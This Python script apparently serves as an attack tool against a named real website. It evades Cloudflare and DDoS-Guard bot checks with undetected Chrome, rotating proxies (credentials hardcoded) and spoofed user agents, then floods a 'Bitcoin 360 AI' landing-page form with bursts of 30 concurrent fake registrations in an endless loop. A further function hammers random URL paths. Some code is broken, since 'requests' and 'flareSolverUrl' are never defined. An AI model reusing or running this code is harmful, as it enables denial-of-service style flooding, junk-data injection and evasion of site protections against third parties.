from urllib import request
import grequests
import json
from threading import Thread, Lock
import random
import string
import time
from selenium.webdriver.chrome.webdriver import WebDriver
import os
import re
import undetected_chromedriver as uc
import shutil
import tempfile
from selenium.common import TimeoutException
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support.expected_conditions import presence_of_element_located, staleness_of, title_is
from selenium.webdriver.common.by import By
from random_user_agent.user_agent import UserAgent
from random_user_agent.params import SoftwareName, OperatingSystem
from selenium.webdriver.support import expected_conditions as EC

software_names = [SoftwareName.CHROME.value]
operating_systems = [OperatingSystem.WINDOWS.value]   

user_agent_rotator = UserAgent(software_names=software_names, operating_systems=operating_systems, limit=100)

# printing lowercase
letters = string.ascii_lowercase

PORT=10000
PROXY_USER = 'spwn69j9vr' 
PROXY_PASS = '123123123'
# PROXY_URL_BASE = 'http://'+PROXY_USER+':'+PROXY_PASS+'@gb.smartproxy.com:PORT'
PROXY_URL_BASE = 'http://'+PROXY_USER+':'+PROXY_PASS+'@gate.smartproxy.com:PORT'

PROXY_URL= '127.0.0.1:8080'

SHORT_TIMEOUT = 30

proxies = {
   'http': PROXY_URL,
   'https': PROXY_URL,
}

attackList = [
'https://www.business2community.com',
]

class ProxyExtension:
    manifest_json = """
    {
        "version": "1.0.0",
        "manifest_version": 2,
        "name": "Chrome Proxy",
        "permissions": [
            "proxy",
            "tabs",
            "unlimitedStorage",
            "storage",
            "<all_urls>",
            "webRequest",
            "webRequestBlocking"
        ],
        "background": {"scripts": ["background.js"]},
        "minimum_chrome_version": "76.0.0"
    }
    """

    background_js = """
    var config = {
        mode: "fixed_servers",
        rules: {
            singleProxy: {
                scheme: "http",
                host: "%s",
                port: %s
            },
            bypassList: ["localhost"]
        }
    };

    chrome.proxy.settings.set({value: config, scope: "regular"}, function() {});

    function callbackFn(details) {
        return {
            authCredentials: {
                username: "%s",
                password: "%s"
            }
        };
    }

    chrome.webRequest.onAuthRequired.addListener(
        callbackFn,
        { urls: ["<all_urls>"] },
        ['blocking']
    );
    """

    def __init__(self, host, port, user, password):
        self._dir = os.path.normpath(tempfile.mkdtemp())

        manifest_file = os.path.join(self._dir, "manifest.json")
        with open(manifest_file, mode="w") as f:
            f.write(self.manifest_json)

        background_js = self.background_js % (host, port, user, password)
        background_file = os.path.join(self._dir, "background.js")
        with open(background_file, mode="w") as f:
            f.write(background_js)

    @property
    def directory(self):
        return self._dir

def my_handler(request, exception):
    print(f"exception thrown by grequests: \n{exception}")
    return request

def checkIp():
	ipUrl='https://api.ipify.org'
	print(requests.get(ipUrl, proxies=proxies).content)
	# input()


def checkmyHeaders():
	url='http://myhttpheader.com/'
	data = {"cmd": "request.get",
			"url": url,
			}
	resStr = requests.post(flareSolverUrl, json=data).content
	print(resStr)
	input()

def changeProxies():
	PORT=random.randrange(10002,32048)
	PROXY_URL = PROXY_URL_BASE.replace('PORT',str(PORT))

	proxies = {
   'http': PROXY_URL,
   'https': PROXY_URL,
	}

	return PROXY_URL, proxies

def attackUrlCF(baseUrl):	
	global cookiesStr, userAgent

	#url, proxies = changeProxies()

	while True:
		try:
			url = baseUrl + '/' + ''.join(random.choice(letters) for i in range(15)) 

			headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
			'Accept-Language': 'en-US,en;q=0.5',
			'Accept-Encoding': 'gzip, deflate, br',
			'Connection': 'keep-alive',
			'Upgrade-Insecure-Requests': '1',
			'Sec-Fetch-Dest': 'document',
			'Sec-Fetch-Mode': 'navigate',
			'Sec-Fetch-Site': 'none',
			'Sec-Fetch-User': '?1',
			# 'Pragma': 'no-cache',
			# 'Cache-Control': 'no-cache'
			}

			# checkIp()

			res = requests.get(url, headers=headers, proxies=proxies, verify=False)
			print(res, res.content)
			input()
			if str(res.status_code) in ['503', '403', '429']:
				input('blocked')
			
			# input()
		except Exception as err:
			print(err)
			#input()

FLARESOLVERR_VERSION = None
CHROME_MAJOR_VERSION = None
USER_AGENT = None
XVFB_DISPLAY = None
PATCHED_DRIVER_PATH = None

def get_chrome_exe_path() -> str:
    return uc.find_chrome_executable()

def extract_version_registry(output) -> str:
    try:
        google_version = ''
        for letter in output[output.rindex('DisplayVersion    REG_SZ') + 24:]:
            if letter != '\n':
                google_version += letter
            else:
                break
        return google_version.strip()
    except TypeError:
        return ''



def extract_version_folder() -> str:
    # Check if the Chrome folder exists in the x32 or x64 Program Files folders.
    for i in range(2):
        path = 'C:\\Program Files' + (' (x86)' if i else '') + '\\Google\\Chrome\\Application'
        if os.path.isdir(path):
            paths = [f.path for f in os.scandir(path) if f.is_dir()]
            for path in paths:
                filename = os.path.basename(path)
                pattern = '\d+\.\d+\.\d+\.\d+'
                match = re.search(pattern, filename)
                if match and match.group():
                    # Found a Chrome version.
                    return match.group(0)
    return ''


def get_chrome_major_version() -> str:
    global CHROME_MAJOR_VERSION
    if CHROME_MAJOR_VERSION is not None:
        return CHROME_MAJOR_VERSION

    if os.name == 'nt':
        try:
            stream = os.popen(
                'reg query "HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Google Chrome"')
            output = stream.read()
            # Example: '104.0.5112.79'
            complete_version = extract_version_registry(output)
        except Exception:
            # Example: '104.0.5112.79'
            complete_version = extract_version_folder()
    else:
        chrome_path = uc.find_chrome_executable()
        process = os.popen(f'"{chrome_path}" --version')
        # Example 1: 'Chromium 104.0.5112.79 Arch Linux\n'
        # Example 2: 'Google Chrome 104.0.5112.79 Arch Linux\n'
        complete_version = process.read()
        process.close()

    CHROME_MAJOR_VERSION = complete_version.split('.')[0].split(' ')[-1]
    return CHROME_MAJOR_VERSION

def start_xvfb_display():
    global XVFB_DISPLAY
    if XVFB_DISPLAY is None:
        from xvfbwrapper import Xvfb
        XVFB_DISPLAY = Xvfb()
        XVFB_DISPLAY.start()

CHALLENGE_TITLES = [
    # Cloudflare
    'Just a moment...',
    # DDoS-GUARD
    'DDOS-GUARD',
]
CHALLENGE_SELECTORS = [
    # Cloudflare
    '#cf-challenge-running', '.ray_id', '.attack-box', '#cf-please-wait', '#challenge-spinner', '#trk_jschal_js',
    # Custom CloudFlare for EbookParadijs, Film-Paleis, MuziekFabriek and Puur-Hollands
    'td.info #js_info'
]

def get_driver():
	global PATCHED_DRIVER_PATH

	options = uc.ChromeOptions()
	# options.add_argument('--no-sandbox')
	options.add_argument('--window-size=1920,1080')
	# todo: this param shows a warning in chrome head-full
	# options.add_argument('--disable-setuid-sandbox')
	# options.add_argument('--disable-dev-shm-usage')
	# options.add_argument('--no-zygote')
	# options.add_argument('--blink-settings=imagesEnabled=false')
	

	# ------ Proxy

	prox_url, proxies = changeProxies()
	r = re.findall('\/\/(.+?):(.+?)@(.+?):(.+)', prox_url)
	print(r)
	username = r[0][0]
	password = r[0][1]
	host = r[0][2]
	port = r[0][3]
	proxy = (host, port, username, password) 
	proxy_extension = ProxyExtension(*proxy)
	print(proxy_extension.directory)
	options.add_argument(f"--load-extension={proxy_extension.directory}") #,/root/blablabla/capExt
	print('proxy is set to %s' % prox_url)

	userAgent = user_agent_rotator.get_random_user_agent()
	userAgent = re.sub('Chrome\/.+?\.', 'Chrome/' + str(random.randint(99,109)) + '.', userAgent)
	options.add_argument('--user-agent=' + userAgent + '')
	print('user agent is: ', userAgent)

	# if we are inside the Docker container, we avoid downloading the driver
	driver_exe_path = None
	version_main = None
	if os.path.exists("/app/chromedriver"):
		# running inside Docker
		driver_exe_path = "/app/chromedriver"
	else:
		version_main = get_chrome_major_version()
		if PATCHED_DRIVER_PATH is not None:
			driver_exe_path = PATCHED_DRIVER_PATH

	# downloads and patches the chromedriver
	# if we don't set driver_executable_path it downloads, patches, and deletes the driver each time
	windows_headless = False
	if os.name == 'nt':
		windows_headless = True
	else:
		start_xvfb_display()

	driver = uc.Chrome(options=options, driver_executable_path=driver_exe_path, version_main=version_main,
		windows_headless=windows_headless)

	# save the patched driver to avoid re-downloads
	if driver_exe_path is None:
		PATCHED_DRIVER_PATH = os.path.join(driver.patcher.data_path, driver.patcher.exe_name)
		shutil.copy(driver.patcher.executable_path, PATCHED_DRIVER_PATH)

	# driver.get('https://api.ipify.org')
	# print('used ip is %s' % driver.page_source)

	return driver, userAgent, proxies

def sendRequest(url, proxies, userAgent, cookies):
	headers={			
			'Accept-Language': 'en-US,en;q=0.9',
			'Accept-Encoding': 'gzip, deflate',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',	
			'User-Agent': userAgent,
			'Connection': 'keep-alive',
			'Upgrade-Insecure-Requests': '1',
			}

	data = {
    "country": "NL",
    "submission_type": "standard",
    "firstname": ''.join(random.choice(letters) for i in range(random.randint(3,6))),
    "lastname": ''.join(random.choice(letters) for i in range(random.randint(3,6))),
    "email": ''.join(random.choice(letters) for i in range(10)) + "@gmail.com",
    "telephone": '11111' + str(random.randint(1111,9999))
	}

	cookiesDict = {}
	for cookie in cookies:
		cookiesDict[cookie['name']] = cookie['value']

	requestsArr = []
	for x in range(30):
		requestsArr.append(grequests.post(url, json=data, headers=headers, proxies=proxies, cookies=cookiesDict))
	res = grequests.map(requestsArr, exception_handler=my_handler)
	print(res)
	for r in res:
		if str(r.status_code) in ['200']:					
			return 200
		if str(r.status_code) in ['502', '524']:	
			return 500
		if str(r.status_code)[0] in ['4']:	
			return 400
	return 0

def attackSelenium(baseUrl):

	driver, userAgent, proxies = get_driver()
	
	while True:
		try:
			url = baseUrl #+ '/?s=' + ''.join(random.choice(letters) for i in range(random.randint(11,30))) 
			# url = baseUrl + '/' + ''.join(random.choice(letters) for i in range(random.randint(11,30)))
			# url = baseUrl
			print(url)
			driver.get(url)

			html_element = driver.find_element(By.TAG_NAME, "html")
			page_title = driver.title

			challenge_found = False
			for title in CHALLENGE_TITLES:
				if title == page_title:
					challenge_found = True
					print("Challenge detected. Title found: " + title)
					break
			if not challenge_found:
				# find challenge by selectors
				for selector in CHALLENGE_SELECTORS:
					found_elements = driver.find_elements(By.CSS_SELECTOR, selector)
					if len(found_elements) > 0:
						challenge_found = True
						print("Challenge detected. Selector found: " + selector)
						break

			if challenge_found:
				while True:
					try:
						# wait until the title changes
						for title in CHALLENGE_TITLES:
							print("Waiting for title: " + title)
							WebDriverWait(driver, SHORT_TIMEOUT).until_not(title_is(title))

						# then wait until all the selectors disappear
						for selector in CHALLENGE_SELECTORS:
							print("Waiting for selector: " + selector)
							WebDriverWait(driver, SHORT_TIMEOUT).until_not(
								presence_of_element_located((By.CSS_SELECTOR, selector)))

						# all elements not found
						break

					except TimeoutException:
						print("Timeout waiting for selector")
						break
						html_element = driver.find_element(By.TAG_NAME, "html")
						

				# waits until cloudflare redirection ends
				print("Waiting for redirect")
				try:
					WebDriverWait(driver, SHORT_TIMEOUT).until(staleness_of(html_element))
				except Exception:
					print("Timeout waiting for redirect")

				print('challenge solved')

			print(driver.title)
			# input('sendkeys')
			# if driver.title == 'Immediate Connect':
			if driver.title == 'Bitcoin 360 AI':
				while True:
					try:
						res = sendRequest(driver.current_url, proxies, userAgent, driver.get_cookies())
						if res == 500 and random.randint(1,3) == 1:
							break
						if res == 400:
							break
						# input = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.NAME, 'firstname')))

						# driver.find_element(By.NAME, 'firstname').send_keys('asd')
						# driver.find_element(By.NAME, 'lastname').send_keys('asd')
						# driver.find_element(By.NAME, 'email').send_keys(''.join(random.choice(letters) for i in range(10)) + '@gmail.com')
						# driver.find_element(By.NAME, 'telephone').send_keys('79757' + str(random.randint(10000,99999)))

						# driver.find_element(By.CLASS_NAME, 'register').click()
						# driver.refresh()
					except Exception as err:
						print(err)
						break

					print(driver.title)
					if driver.title == 'investing-advisor/life coach tips':
						break

			# for i in range(200):
			# 	input = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.NAME, 's')))
			# 	input.send_keys(''.join(random.choice(letters) for i in range(random.randint(11,30))))
			# 	time.sleep(100)

			# input()
		except Exception as err:
			print(err)
			#input()
		finally:
			driver.close()
			driver, userAgent, proxies = get_driver()


attackSelenium('https://www.business2community.com/visit/bitcoin-360-ai')
input()
# for i in range(5):
# 	Thread(target=attackSelenium, args=['https://www.business2community.com/visit/immediate-connect/']).start()
# input()


